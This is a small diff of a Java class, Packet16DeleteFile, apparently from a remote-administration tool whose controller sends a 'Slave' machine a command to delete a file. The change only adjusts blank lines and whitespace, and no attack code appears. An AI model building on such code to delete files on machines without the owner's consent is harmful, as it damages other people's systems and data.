@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet16DeleteFile extends AbstractOutgoingPacket {
-	
+
 	private String file;
-	
+
 	public Packet16DeleteFile(String file) {
 		this.file = file;
 	}
